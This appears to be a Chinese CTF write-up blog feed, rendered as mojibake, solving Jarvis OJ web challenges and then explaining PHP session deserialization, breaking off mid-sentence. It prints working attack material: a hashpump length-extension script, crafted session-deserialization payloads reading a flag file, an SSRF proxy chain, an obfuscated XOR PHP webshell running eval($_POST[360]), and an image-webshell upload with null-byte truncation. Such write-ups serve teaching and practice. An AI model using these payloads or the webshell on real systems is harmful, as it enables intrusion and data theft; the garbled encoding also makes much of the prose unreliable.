message)çš„å€¼åŠsecreté•¿åº¦çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è½»æ¾æ¨ç®—å‡ºhash(secret + message||padding||mâ€™)ã€‚åœ¨è¿™é‡Œmâ€™æ˜¯ä»»æ„æ•°æ®ï¼Œ||æ˜¯è¿æ¥ç¬¦ï¼Œå¯ä»¥ä¸ºç©º,paddingæ˜¯secretåçš„å¡«å……å­—èŠ‚ã€‚hashçš„paddingå­—èŠ‚åŒ…å«æ•´ä¸ªæ¶ˆæ¯çš„é•¿åº¦ï¼Œå› æ­¤ï¼Œä¸ºäº†èƒ½å‡†ç¡®è®¡ç®—å‡ºpaddingçš„å€¼ï¼Œsecretçš„é•¿åº¦æˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“çš„ã€‚</p><p>å½“æˆ‘ä»¬å¡«å……åï¼ŒæœåŠ¡å™¨ç®—å‡ºçš„åŸå§‹hashå€¼ï¼Œæ­£å¥½ä¸æˆ‘ä»¬æ·»åŠ æ‰©å±•å­—ç¬¦ä¸²å¹¶è¦†ç›–åˆå§‹é“¾å˜é‡æ‰€è®¡ç®—å‡ºæ¥çš„ä¸€æ ·ã€‚è¿™æ˜¯å› ä¸ºæ”»å‡»è€…çš„å“ˆå¸Œè®¡ç®—è¿‡ç¨‹ï¼Œç›¸å½“äºä»æœåŠ¡å™¨è®¡ç®—è¿‡ç¨‹çš„ä¸€åŠç´§æ¥ç€è¿›è¡Œä¸‹å»ã€‚æäº¤æ­¤hashå€¼ä¾¿èƒ½é€šè¿‡éªŒè¯äº†ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»(Hash Length Extension Attacks)ã€‚</p></blockquote><p>MD5ä¼šå¯¹æ¶ˆæ¯è¿›è¡Œåˆ†ç»„ï¼Œæ¯ç»„64Byte,ä¹Ÿå°±æ˜¯512bit,ä¸è¶³512bitçš„ä¼šè¡¥ä½ï¼Œä½¿é•¿åº¦è¡¥å……åˆ°56Byte,è¡¥ä½çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯åœ¨æ¶ˆæ¯åé¢åŠ ä¸€ä¸ª1ï¼Œåé¢éƒ½æ˜¯0ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨16è¿›åˆ¶ä¸‹æˆ‘ä»¬éœ€è¦åœ¨åé¢è¡¥80ï¼Œå…¶ä»–éƒ½æ˜¯0ï¼Œç›´åˆ°è¡¥åˆ°56Byteã€‚</p><p>å‰©ä¸‹çš„8Byteè¡¨ç¤ºè¡¥ä½å‰æ¶ˆæ¯é•¿åº¦ï¼Œè¯¥é•¿åº¦æ˜¯å°ç«¯å­˜å‚¨ï¼Œé«˜å­—èŠ‚æ”¾åœ¨é«˜åœ°å€ä¸­ã€‚è®¡ç®—å¼€å§‹å‰æœ‰ä¸€ç»„åˆå§‹å‘é‡è´Ÿè´£ç¬¬ä¸€è½®çš„åŠ å¯†ï¼Œæ­¤åæ¯ä¸€æ¬¡åŠ å¯†çš„ç»“æœä½œä¸ºä¸‹ä¸€æ¬¡åŠ å¯†çš„åˆå§‹å‘é‡ã€‚</p><p>MD5çš„åˆå§‹å‘é‡æ˜¯</p><pre><code>A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476</code></pre><p>æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹è¡¥ä½</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg" alt></p><p>å†æ¥çœ‹è¿™é“é¢˜</p><p>æˆ‘ä»¬ä¸çŸ¥é“saltçš„é•¿åº¦ï¼Œè€Œç®—æ³•çš„æ ¸å¿ƒå°±æ˜¯è¦çŸ¥é“å…¶é•¿åº¦ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥çˆ†ç ´çŒœå‡ºæ¥ã€‚åŒæ—¶è¿™é‡Œå¯¹roleååºäº†ã€‚</p><p>æˆ‘ä»¬åˆ©ç”¨hashpumpè·‘ä¸€ä¸‹</p><pre><code>hashpumpInput Signature: 3a4727d57463f122833d9e732f94e4e0 //ä¸Šä¸€è½®çš„ç»“æœï¼Œæˆ‘ä»¬å·²ç»æŠ“åŒ…å¾—åˆ°äº† Input Data: ;&quot;tseug&quot;:5:s  //åŸæ¥çš„æ•°æ®Input Key Length: 12      //é•¿åº¦æ˜¯è¯•å‡ºæ¥çš„Input Data to Add: ;&quot;nimda&quot;:5:s //æˆ‘ä»¬è¦æ·»åŠ çš„æ•°æ®fcdc3840332555511c4e4323f6decb07;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s  //è®°å¾—é€†åºä¸€ä¸‹ï¼Œç„¶åURLç¼–ç </code></pre><p>å¾—åˆ°</p><pre><code>role: s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3Bhsh: fcdc3840332555511c4e4323f6decb07</code></pre><p>æ”¾åœ¨cookieé‡Œå°±å¯ä»¥äº†ã€‚</p><p>æ”¾ä¸€ä¸ªå…¶ä»–äººå†™çš„è„šæœ¬</p><pre><code># -*- coding: utf-8 -*-import requests,hashpumpy,urllibdef webre(): #py2url = &apos;http://web.jarvisoj.com:32778/&apos;sha = &apos;3a4727d57463f122833d9e732f94e4e0&apos;string0 = &apos;;&quot;tseug&quot;:5:s&apos;string1 = &apos;;&quot;nimda&quot;:5:s&apos;for i in range(15):    digest, message = hashpumpy.hashpump(sha,string0,string1,i)    payload ={&apos;role&apos;:urllib.quote(message[::-1]), &apos;hsh&apos;:digest}    #payload ={&apos;role&apos;:(message[::-1]), &apos;hsh&apos;:digest}    print i,payload    html = requests.get(url,cookies=payload).text#æäº¤ç­”æ¡ˆ    if &apos;Welcome&apos; in html:        print htmlwebre()</code></pre><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &apos;phpinfo();&apos;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&apos;phpinfo&apos;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt;</code></pre><p>è§‚å¯Ÿåˆ°é¢˜ç›®phpinfoä¸­çš„é…ç½®</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p><p>æ„é€ ä¸€ä¸ªPOSTé¡µé¢</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>ç”±é¢˜ç›®çš„<code>phpinfo</code>å¯çŸ¥ï¼Œå…¨å±€sessionåºåˆ—åŒ–å™¨è®¾ç½®ä¸ºäº†<code>php_serialize</code>ï¼Œå› æ­¤<code>upload_progress</code>ä¼šç”¨<code>php_serialize</code>çš„æ–¹å¼åˆ›å»º<code>session</code>æ–‡ä»¶.åœ¨æ‰§è¡Œ<code>index.php</code>æ—¶ï¼Œè¯¥ä»£ç å°†å¤„ç†å™¨è®¾ç½®ä¸ºäº†php,ç„¶å<code>session_start()</code>æ¥è¯»å–sessionæ–‡ä»¶ã€‚ç”±ä¸Šæ–‡çš„phpåºåˆ—åŒ–å™¨å¤„ç†æ–¹å¼å¯çŸ¥æˆ‘ä»¬åœ¨sessionä¸­æ„é€ <code>|åºåˆ—åŒ–å­—ç¬¦ä¸²</code>å°±å¯ä»¥ã€‚åŒæ—¶è¯¥é¢˜ç›®çš„<code>cleanup</code>ä¹Ÿè®¾ç½®ä¸ºäº†<code>off</code></p><p>ç„¶åè¿›è¡Œåºåˆ—åŒ–ã€‚å°†å¤„ç†å™¨è®¾ç½®ä¸º<code>php_serialize</code></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();class OowoO{public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;echo serialize($a);?&gt;</code></pre><p>å¾—åˆ°</p><pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>å…ˆåœ¨æœ¬åœ°æ‰“å¼€POSTé¡µé¢ï¼Œéšä¾¿æäº¤ä¸€ä¸ªä¸œè¥¿ç„¶åæŠ“åŒ…å°†<code>filename</code>æ”¹ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚åŒæ—¶ä¸ºäº†è¾¾åˆ°ä½¿ç”¨phpè§£é‡Šåå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œè¦åœ¨æœ€å‰é¢åŠ ä¸Š<code>|</code>ï¼ŒåŒæ—¶ä¸ºäº†é˜²æ­¢è½¬ä¹‰ï¼Œåœ¨å¼•å·å‰é¢åŠ ä¸Š<code>\</code>.</p><p>è¯»åˆ°å¦‚ä¸‹ä¿¡æ¯</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p><p>ç”±<code>phpinfo</code>ä¸­<code>Apache Environment</code>å¯çŸ¥é¢˜ç›®è·¯å¾„ä¸º<code>/opt/lampp/htdocs/index.php</code></p><p>äºæ˜¯æˆ‘ä»¬ä¿®æ”¹mdzzçš„å€¼ä¸º</p><pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>å¾—åˆ°</p><pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>æäº¤å¾—åˆ°flag</p><pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><p>è€ƒå¯ŸXXEï¼Œæ‹¿åˆ°é¢˜ç›®å…ˆçœ‹ä¸€ä¸‹æºç å‘ç°å¤„ç†xmlçš„ä»£ç ï¼Œäºæ˜¯æŠ“åŒ…æ”¹content-typeæµ‹è¯•xmlä»£ç </p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g69zc4iiq8j30ne0cpdh5.jpg" alt="æµ‹è¯•xmlæ˜¯å¦å¯ä»¥æ‰§è¡Œ"></p><p>æ‹¿åˆ°flag</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g69zc6zc3cj30nr0aejsl.jpg" alt="è¯»æ–‡ä»¶"></p><h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>åˆšå¼€å§‹çš„ç½‘ç«™ç‚¹å‡»ç®¡ç†å‘˜ç™»é™†æç¤º<code>you are not admin</code>æ²¡æœ‰æƒé™è®¿é—®/adminè¿™ä¸ªè·¯å¾„ï¼ŒæŸ¥çœ‹æºç å‘ç°æç¤ºadminçš„IP<code>&lt;!--&lt;script&gt;alert(&#39;admin ip is 202.5.19.128&#39;)&lt;/script&gt;--&gt;</code>ï¼›å›åˆ°æœ€å¼€å§‹çš„èœåˆ€é¡µé¢æŸ¥çœ‹æºç å‘ç°å›¾ç‰‡çš„é“¾æ¥å¾ˆå¥‡æ€ª</p><pre><code>http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></pre><p>å®ƒæ˜¯é€šè¿‡å‰é¢ä¸€ä¸ªé“¾æ¥çš„<code>proxy.php</code>å¼•å…¥çš„ï¼Œè”æƒ³åˆ°é€šè¿‡æ„é€ URLçš„æ–¹å¼åˆ©ç”¨ä»£ç†è®¿é—®æˆ‘ä»¬æ²¡æœ‰æƒé™çš„è·¯å¾„ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ </p><pre><code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code></pre><p>ç„¶åæˆ‘ä»¬æ‰«åˆ°è¿™ä¸ªè·¯å¾„ä¸‹æœ‰<code>robots.txt</code></p><pre><code>User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt</code></pre><p>è®¿é—®txtå‘ç°ä¸€æ®µä»£ç </p><pre><code>&lt;?php ${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}=(&quot;!&quot;^&quot;`&quot;).(&quot;( &quot;^&quot;{&quot;).(&quot;(&quot;^&quot;[&quot;).(&quot;~&quot;^&quot;;&quot;).(&quot;|&quot;^&quot;.&quot;).(&quot;*&quot;^&quot;~&quot;);${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}((&quot;-&quot;^&quot;H&quot;). (&quot;]&quot;^&quot;+&quot;). (&quot;[&quot;^&quot;:&quot;). (&quot;,&quot;^&quot;@&quot;). (&quot;}&quot;^&quot;U&quot;). (&quot;e&quot;^&quot;A&quot;). (&quot;(&quot;^&quot;w&quot;).(&quot;j&quot;^&quot;:&quot;). (&quot;i&quot;^&quot;&amp;&quot;). (&quot;#&quot;^&quot;p&quot;). (&quot;&gt;&quot;^&quot;j&quot;). (&quot;!&quot;^&quot;z&quot;). (&quot;T&quot;^&quot;g&quot;). (&quot;e&quot;^&quot;S&quot;). (&quot;_&quot;^&quot;o&quot;). (&quot;?&quot;^&quot;b&quot;). (&quot;]&quot;^&quot;t&quot;));?&gt;</code></pre><p>è¿è¡Œç»“æœ</p><pre><code>Notice: Undefined offset: 360 in E:\only_for_code_test.php(1) : assert code on line 1Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for_code_test.php on line 1</code></pre><p>èœåˆ€è¿ä¸€ä¸‹phpæ–‡ä»¶å³å¯å¾—åˆ°flag</p><h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>ä¸Šä¼ é¡µé¢ä¸Šä¼ å›¾ç‰‡é©¬å¾—åˆ°å›¾ç‰‡ID</p><p>å›¾ç‰‡é©¬ ï¼š<code>copy 1.jpg/b+1.php 2.jpg</code></p><p>ç›´æ¥è®¿é—®/uploads/IDçœ‹ä¸åˆ°å›¾ç‰‡ï¼ŒåŒæ—¶viewé¡µé¢ä¹Ÿæ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œè§‚å¯ŸURL</p><p>è®¿é—®</p><pre><code>http://web.jarvisoj.com:32785/index.php/index.php?page=uploads/1566654901.jpg</code></pre><p>çœ‹åˆ°å›æ˜¾</p><p>Warning: fopen(uploads/1566654901.jpg.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24<br>No such file!</p><p>å°è¯•%00æˆªæ–­</p><pre><code>GET /index.php?page=uploads/1566655841.jpg%00 HTTP/1.1</code></pre><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><blockquote><p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p><p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p></blockquote><blockquote><p><a href="https://xz.aliyun.com/t/2563#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2563#toc-2</a></p><p><a href="https://www.jianshu.com/p/5342d07a6956" target="_blank" rel="noopener">https://www.jianshu.com/p/5342d07a6956</a><br><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/69264.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> serialize </tag>
            
            <tag> SQL </tag>
            
            <tag> å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Session_unserlize</title>
      <link href="/2019/08/01/session-unserialize/"/>
      <url>/2019/08/01/session-unserialize/</url>
      
        <content type="html"><![CDATA[<p>sessionçš„ååºåˆ—åŒ–åˆ©ç”¨</p><a id="more"></a><p>8/1/2019 10:44:57 AM </p><h2 id="å¯¹é­”æ³•å‡½æ•°çš„å†æ¬¡è®¤è¯†"><a href="#å¯¹é­”æ³•å‡½æ•°çš„å†æ¬¡è®¤è¯†" class="headerlink" title="å¯¹é­”æ³•å‡½æ•°çš„å†æ¬¡è®¤è¯†"></a>å¯¹é­”æ³•å‡½æ•°çš„å†æ¬¡è®¤è¯†</h2><h3 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h3><pre><code>__construct()//åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</code></pre><h4 id="åºåˆ—åŒ–æœºåˆ¶"><a href="#åºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="åºåˆ—åŒ–æœºåˆ¶"></a>åºåˆ—åŒ–æœºåˆ¶</h4><pre><code>Strings:size:value;Integeri:value;Booleanb:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &apos;1&apos; or &apos;0&apos;)NullN;Arraya:size:{key definition;value definition;(repeated per element)}ObjectO:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶<strong>è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„</strong>ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´åºåˆ—åŒ–æ—¶æ²¡æœ‰è¢«åˆ©ç”¨åˆ°çš„å±æ€§ä¼šè¢«æ¸…ç†ã€‚</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ä¼šåœ¨<code>unserilize</code>ä¹‹å‰å‡†å¤‡å¥½å¯èƒ½ä¼šç”¨åˆ°çš„å¯¹è±¡èµ„æº</p><p>æ‹¿<a href="https://xz.aliyun.com/t/3674#toc-5" title="å¸ˆå‚…åšå®¢" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-5</a>å¸ˆå‚…æ–‡ç« çš„ä»£ç åšä¸ªä¾‹å­ï¼š</p><pre><code>&lt;?php class Caiji{public function __construct($ID, $sex, $age){$this-&gt;ID = $ID;$this-&gt;sex = $sex;$this-&gt;age = $age;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}public function getInfo(){echo $this-&gt;info . &apos;&lt;br&gt;&apos;;}/** * serializeå‰è°ƒç”¨ ç”¨äºåˆ é€‰éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å˜é‡ * @return array [description] */public function __sleep(){echo __METHOD__ . &apos;&lt;br&gt;&apos;;return [&apos;ID&apos;, &apos;sex&apos;, &apos;age&apos;];}/** * unserializeå‰è°ƒç”¨ ç”¨äºé¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æº */public function __wakeup(){echo __METHOD__ . &apos;&lt;br&gt;&apos;;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}}$me = new Caiji(&apos;Luc1fer&apos;, 20, &apos;male&apos;);$me-&gt;getInfo();//å­˜åœ¨__sleep(å‡½æ•°ï¼Œ$infoå±æ€§ä¸ä¼šè¢«å­˜å‚¨$temp = serialize($me);echo $temp . &apos;&lt;br&gt;&apos;;$me = unserialize($temp);//__wakeup()ç»„è£…çš„$info$me-&gt;getInfo();?&gt;</code></pre><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ ï¼š</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg" alt="é­”æ³•å‡½æ•°æ‰§è¡Œç»“æœ"></p><p>å¦‚æœçœ‹ä¸å¤ªæ¸…æ¥šå‡½æ•°çš„ç”¨æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å†æ”¹ä¸€ä¸‹ä»£ç çœ‹çœ‹æ•ˆæœï¼Œæˆ‘ä»¬è¿™æ¬¡æ³¨é‡Šæ‰äº†<code>__sleep()</code>å‡½æ•°ï¼Œå¹¶ä¸”åœ¨å…¶ä»–å‡½æ•°é‡Œå¢åŠ äº†æç¤ºè¯­å¥ï¼š</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg" alt="ä¿®æ”¹ä¹‹åçš„æ•ˆæœ"></p><p>å¯ä»¥çœ‹åˆ°å› ä¸º<code>sleep</code>çš„å­˜åœ¨ï¼Œ<code>info</code>å±æ€§è¢«åˆ é™¤ï¼Œå¯¼è‡´<code>getinfo()</code>ä½¿ç”¨æ—¶æ— æ³•æ‰“å°<code>Info</code>å±æ€§ï¼Œåœ¨æˆ‘ä»¬æ³¨é‡Šæ‰<code>sleep</code>ä¹‹åï¼Œæ‰€æœ‰çš„å±æ€§éƒ½æ­£å¸¸æ‰“å°äº†ï¼Œ<code>wakeup</code>ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p></blockquote><pre><code>&lt;?php class Caiji{public function __construct($ID, $sex, $age){$this-&gt;ID = $ID;$this-&gt;sex = $sex;$this-&gt;age = $age;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}public function __toString(){return $this-&gt;info;}}$me = new Caiji(&apos;twosmi1e&apos;, 20, &apos;male&apos;);echo &apos;__toString:&apos; . $me . &apos;&lt;br&gt;&apos;;?&gt;__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id="session-ååºåˆ—åŒ–"><a href="#session-ååºåˆ—åŒ–" class="headerlink" title="session ååºåˆ—åŒ–"></a>session ååºåˆ—åŒ–</h2><p>PHPåœ¨sessionå­˜å‚¨å’Œè¯»å–æ—¶éƒ½ä¼šæœ‰ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œphpå†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å–$_SESSIONæ•°æ®ï¼Œå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚</p><p>è¿™æ˜¯php.iniä¸­çš„é…ç½®é¡¹</p><p><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png" alt="phpinfoé…ç½®"><br><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png" alt></p><ul><li><code>session.save_path</code> è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</li><li><code>session.save_handler</code> è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°</li><li><code>session.auto_start</code> æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯</li><li><code>session.serialize_handler</code> å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</li></ul><p>å¯¹äºå¤„ç†å™¨ï¼Œå¸¸ç”¨çš„æœ‰ä¸‰ç§ï¼Œå¯¹åº”ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg" alt="å¤„ç†å™¨çš„å¤„ç†æ–¹å¼"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸åŒå‚¨å­˜æ–¹å¼å‚¨å­˜çš„åŒºåˆ«ï¼š</p><p>é€‰æ‹©ä¸åŒçš„å¤„ç†å™¨æ¥ç”Ÿæˆsessionï¼Œç”Ÿæˆçš„æ–‡ä»¶å°±å‚¨å­˜åœ¨ä¸Šå›¾å¯¹åº”ç›®å½•ä¸­</p><pre><code>&lt;?ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&apos;name&apos;] = &apos;Luc1fer&apos;;?&gt;php_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}php: name|s:7:&quot;Luc1fer&quot;;php_binary: EOTnames:7:&quot;Luc1fer&quot;;</code></pre><p>å¦‚æœ<strong>PHPåœ¨ååºåˆ—åŒ–å­˜å‚¨çš„$_SESSIONæ•°æ®æ—¶ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒ</strong>ï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šæ„é€ 